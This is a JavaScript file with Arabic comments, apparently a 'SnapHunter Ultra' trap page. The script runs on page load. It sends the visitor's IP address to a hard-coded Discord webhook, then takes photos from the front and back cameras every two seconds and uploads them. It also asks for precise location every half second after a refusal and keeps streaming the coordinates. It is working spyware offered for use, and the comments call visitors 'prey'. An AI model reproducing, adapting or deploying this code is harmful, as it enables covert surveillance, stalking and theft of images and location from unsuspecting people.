'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. إرسال البيانات فوراً لديسكورد
async function sendPacket(blob, content) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'capture.jpg');
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter Ultra"
    }));

    try {
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    } catch (e) { console.error("Error sending..."); }
}

// 2. طلب الموقع بشكل إجباري ومتكرر (مباشرة بعد الكاميرا)
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            sendPacket(null, `📍 **الموقع المباشر:**\nhttps://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => {
            // تكرار الطلب كل نصف ثانية في حال الرفض
            setTimeout(forceLocation, 500);
        },
        { enableHighAccuracy: true }
    );
}

// 3. التقاط الصور (أمامية وخلفية) بسرعة عالية
async function captureAndSend(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        
        await new Promise(r => video.onloadeddata = r);
        video.play();

        // انتظار بسيط جداً (200ms) لضمان عدم ظهور سواد
        await new Promise(r => setTimeout(r, 200));

        const ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4)); // ضغط عالي للسرعة
        
        stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للتبديل للأخرى
        
        let label = mode === 'user' ? "الأمامية (سيلفي)" : "الخلفية";
        await sendPacket(blob, `📸 لقطة من الكاميرا: \`${label}\``);
    } catch (e) { }
}

// 4. المحرك الأساسي (يعمل لحظة الدخول)
(async function init() {
    // إرسال الـ IP فوراً عند فتح الرابط
    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
        sendPacket(null, `🚀 **صيد جديد دخل الموقع!**\n🌐 IP: \`${data.ip}\``);
    });

    try {
        // أ- اطلب الكاميرا أولاً
        const mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
        mainStream.getTracks().forEach(t => t.stop()); // فتح الصلاحية العامة

        // ب- اطلب الموقع "مباشرة" بعد الكاميرا بدون أي تأخير
        forceLocation();

        // ج- ابدأ حلقة التصوير (كل ثانيتين تكرار)
        const mainLoop = async () => {
            await captureAndSend('user');        // التقاط أمامية
            await captureAndSend('environment'); // التقاط خلفية
            
            // في حال تم الحصول على الموقع، أرسل تحديثاً معه
            if(userLat) sendPacket(null, `📍 تحديث الموقع: ${userLat},${userLng}`);

            // الانتظار لمدة ثانيتين ثم الإعادة
            setTimeout(mainLoop, 2000);
        };

        mainLoop();

    } catch (err) {
        // إذا رفض الكاميرا، استمر في طلب الموقع وإرسال الـ IP
        forceLocation();
        setInterval(() => {
            if(userLat) sendPacket(null, `📍 تحديث موقع مستمر: ${userLat},${userLng}`);
        }, 5000);
    }
})();
